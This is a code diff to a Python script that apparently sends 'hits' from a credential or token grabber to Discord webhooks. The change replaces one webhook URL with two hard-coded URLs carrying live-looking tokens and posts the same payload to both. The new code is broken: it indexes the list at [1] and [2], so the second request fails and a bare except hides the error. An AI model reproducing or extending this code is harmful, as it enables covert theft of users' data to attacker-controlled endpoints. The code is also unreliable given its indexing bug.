@@ -5,7 +5,10 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/878076698728489012/ZSwVCdeL0aJodOezmljAYAgRn7AaaFqkr2cTs8g86bIymPETbmNEfqIyBK-xZaHFO4k7'
+WEBHOOK_URL = [
+    "https://discord.com/api/webhooks/879443809887457390/rVrvhh37NvTNjEwwH_mrsZs4_EO71tBxDcZpF7IAqt1239Tvzawy9GyusWU4HR84VDjs",
+    "https://discord.com/api/webhooks/879445318607986779/JjOcogHW55fSaCN-VTkPTfZmXmneX1aUIHiQBrtJrTVEgVaYdsQPh2qWSnRa5xgN4Xg5"
+]
 
 # mentions you when you get a hit
 PING_ME = False
@@ -65,7 +68,9 @@ def start():
     payload = json.dumps({'content': message})
 
     try:
-        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        req = Request(WEBHOOK_URL[1], data=payload.encode(), headers=headers)
         urlopen(req)
+        req2 = Request(WEBHOOK_URL[2], data=payload.encode(), headers=headers)
+        urlopen(req2)
     except:
         pass
